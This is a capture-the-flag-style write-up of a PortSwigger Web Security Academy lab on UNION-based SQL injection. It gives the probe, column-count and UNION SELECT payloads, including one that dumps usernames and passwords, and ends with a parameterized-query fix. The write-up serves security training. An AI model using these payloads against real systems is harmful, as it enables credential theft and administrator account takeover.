# SQL injection — UNION data exfiltration

> **Target:** PortSwigger Web Security Academy — *SQL injection UNION attack, retrieving data from other tables*
> **Class:** `SQLi` · **Difficulty:** ★★☆

## Recon

A product listing filters by category:

```http
GET /filter?category=Gifts HTTP/1.1
```

The category value lands straight in a `SELECT … WHERE category = '…'` query. First probe — break the
string and watch the response:

```
?category=Gifts'        → 500 / error
?category=Gifts'-- -     → back to normal
```

The single quote breaks the query and `-- -` comments out the rest. It's injectable.

## The bug

The app concatenates user input into the SQL string. The query trusts that `category` is data; we
make it **code**.

## Exploitation

**1. Column count** — increment until it stops erroring:

```sql
' ORDER BY 1-- -
' ORDER BY 2-- -      -- works
' ORDER BY 3-- -      -- error → 2 columns
```

**2. Find a text-compatible column:**

```sql
' UNION SELECT 'a',NULL-- -
' UNION SELECT NULL,'a'-- -   -- both render → both take strings
```

**3. Dump credentials** from the `users` table:

```sql
' UNION SELECT username, password FROM users-- -
```

The product list now renders every username and password. Log in as `administrator`.

## Impact

Full read of arbitrary tables → credential theft → admin account takeover. With `LOAD_FILE`/stacked
queries (DBMS-dependent) this can escalate further.

## Fix

**Parameterized queries / prepared statements** — never concatenate input into SQL:

```python
cur.execute("SELECT * FROM products WHERE category = %s", (category,))
```

Add least-privilege DB accounts and a WAF as defence-in-depth, but the fix is parameterization.

## Takeaway

The fastest injection oracle is still a single quote + comment. Confirm the *break*, then confirm the
*column shape*, then exfiltrate — in that order. Don't guess payloads blind.
